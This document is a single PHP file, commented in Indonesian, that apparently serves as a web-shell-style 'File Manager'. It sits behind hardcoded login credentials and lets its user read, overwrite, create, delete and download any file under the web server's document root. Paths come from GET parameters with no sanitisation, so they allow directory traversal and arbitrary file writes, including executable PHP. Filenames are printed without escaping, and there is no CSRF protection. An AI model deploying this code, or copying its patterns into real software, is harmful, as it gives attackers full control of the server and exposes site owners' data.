<?php
session_start();

// Username dan password valid
$valid_username = 'udin';
$valid_password = 'udin1234';

// Proses logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Proses login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['logged_in'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = 'Username atau password salah.';
    }
}

// Jika belum login, tampilkan form login
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f4;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }

            .login-container {
                background: white;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
                width: 300px;
                text-align: center;
            }

            .login-container h1 {
                margin-bottom: 20px;
            }

            .login-container form {
                display: flex;
                flex-direction: column;
            }

            .login-container input {
                margin-bottom: 15px;
                padding: 10px;
                font-size: 16px;
                border: 1px solid #ccc;
                border-radius: 4px;
            }

            .login-container button {
                background-color: #4caf50;
                color: white;
                padding: 10px;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                font-size: 16px;
            }

            .login-container button:hover {
                background-color: #45a049;
            }

            .error {
                color: red;
                font-size: 14px;
                margin-bottom: 15px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h1>Login</h1>
            <?php if (isset($login_error)): ?>
                <div class="error"><?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        /* Gaya tampilan */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            color: #333;
        }

        header {
            background-color: #4d90fe;
            color: white;
            padding: 15px 20px;
            text-align: center;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        header h1 {
            margin: 0;
            font-size: 24px;
        }

        main {
            max-width: 900px;
            margin: 20px auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            font-size: 16px;
            border: 1px solid #ddd;
        }

        table th, table td {
            padding: 15px;
            text-align: left;
        }

        table th {
            background-color: #efefef;
            font-weight: bold;
        }

        table tr:nth-child(even) {
            background-color: #f9f9f9;
        }

        table tr.file td:nth-child(3) a {
            display: inline-block;
            margin-right: 10px;
            padding: 5px 10px;
            border-radius: 4px;
            text-decoration: none;
            font-size: 14px;
        }

        table tr.file td:nth-child(3) a.edit {
            background-color: #4caf50;
            color: white;
        }

        table tr.file td:nth-child(3) a.delete {
            background-color: #f44336;
            color: white;
        }

        table tr.file td:nth-child(3) a.download {
            background-color: #2196f3;
            color: white;
        }

        .form-control {
            display: block;
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            margin-bottom: 10px;
        }

        textarea {
            height: 200px;
        }

        .button {
            display: inline-block;
            background-color: #4d90fe;
            color: white;
            padding: 10px 20px;
            font-size: 16px;
            text-decoration: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .button:hover {
            background-color: #357ae8;
        }
    </style>
</head>
<body>
<header>
    <h1>File Manager</h1>
</header>
<main>
    <?php
    // Menentukan root direktori
    $dir = $_SERVER['DOCUMENT_ROOT'];

    // Mendapatkan subdirektori jika ada
    $subdir = isset($_GET['dir']) ? $_GET['dir'] : '';

    // Mendapatkan daftar file dan folder
    $items = scandir($dir . '/' . $subdir);

    // Memisahkan file dan folder
    $folders = [];
    $files = [];
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $fullpath = $dir . '/' . $subdir . '/' . $item;
        if (is_dir($fullpath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }

    // Mengurutkan folder dan file secara abjad
    sort($folders);
    sort($files);

    // Menggabungkan folder dan file
    $sortedItems = array_merge($folders, $files);

    // Fungsi format ukuran file
    function formatSizeUnits($bytes) {
        if ($bytes >= 1073741824) {
            return number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            return number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            return number_format($bytes / 1024, 2) . ' KB';
        } else {
            return $bytes . ' bytes';
        }
    }

    // Jika parameter file diberikan
    if (isset($_GET['file'])) {
        $file = $_GET['file'];
        $fullpath = $dir . '/' . $file;
        if (is_file($fullpath)) {
            $content = file_get_contents($fullpath);
            echo '<form method="post" action="?save=true&file=' . $file . '">';
            echo '<textarea name="content" class="form-control">' . htmlspecialchars($content) . '</textarea>';
            echo '<button type="submit" class="button">Save</button>';
            echo '</form>';
        }
    } else {
        // Tampilkan tabel file dan folder
        echo '<a href="?add=true&dir=' . $subdir . '" class="button">Add File</a>';
        echo '<table>';
        echo '<thead><tr><th>Name</th><th>Size</th><th>Options</th></tr></thead>';
        echo '<tbody>';
        foreach ($sortedItems as $item) {
            $fullpath = $dir . '/' . $subdir . '/' . $item;
            if (is_dir($fullpath)) {
                // Tampilkan folder
                echo '<tr class="folder">';
                echo '<td><strong>Folder:</strong> <a href="?dir=' . $subdir . '/' . $item . '">' . $item . '</a></td>';
                echo '<td>-</td>';
                echo '<td>-</td>';
                echo '</tr>';
            } else {
                // Tampilkan file
                echo '<tr class="file">';
                echo '<td>' . $item . '</td>';
                echo '<td>' . formatSizeUnits(filesize($fullpath)) . '</td>';
                echo '<td>';
                echo '<a href="?file=' . $subdir . '/' . $item . '" class="edit">Edit</a>';
                echo '<a href="?delete=true&file=' . $subdir . '/' . $item . '" class="delete">Delete</a>';
                echo '<a href="?download=true&file=' . $subdir . '/' . $item . '" class="download">Download</a>';
                echo '</td>';
                echo '</tr>';
            }
        }
        echo '</tbody>';
        echo '</table>';
    }

    // Simpan perubahan pada file
    if (isset($_POST['content']) && isset($_GET['save']) && isset($_GET['file'])) {
        $file = $_GET['file'];
        $fullpath = $dir . '/' . $file;
        file_put_contents($fullpath, $_POST['content']);
        header('Location: ?file=' . $file);
        exit;
    }

    // Hapus file
    if (isset($_GET['delete']) && isset($_GET['file'])) {
        $file = $_GET['file'];
        $fullpath = $dir . '/' . $file;
        unlink($fullpath);
        header('Location: ?dir=' . $subdir);
        exit;
    }

    // Download file
    if (isset($_GET['download']) && isset($_GET['file'])) {
        $file = $_GET['file'];
        $fullpath = $dir . '/' . $file;
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fullpath) . '"');
        header('Content-Length: ' . filesize($fullpath));
        readfile($fullpath);
        exit;
    }

    // Form tambah file baru
    if (isset($_GET['add'])) {
        echo '<form method="post" action="?create=true&dir=' . $subdir . '">';
        echo '<input type="text" name="filename" class="form-control" placeholder="Enter file name">';
        echo '<textarea name="content" class="form-control" placeholder="Enter file content"></textarea>';
        echo '<button type="submit" class="button">Create</button>';
        echo '</form>';
    }

    // Tambahkan file baru
    if (isset($_POST['filename']) && isset($_POST['content']) && isset($_GET['create'])) {
        $filename = $_POST['filename'];
        $fullpath = $dir . '/' . $subdir . '/' . $filename;
        file_put_contents($fullpath, $_POST['content']);
        header('Location: ?dir=' . $subdir);
        exit;
    }
    ?>
</main>
</body>
</html>
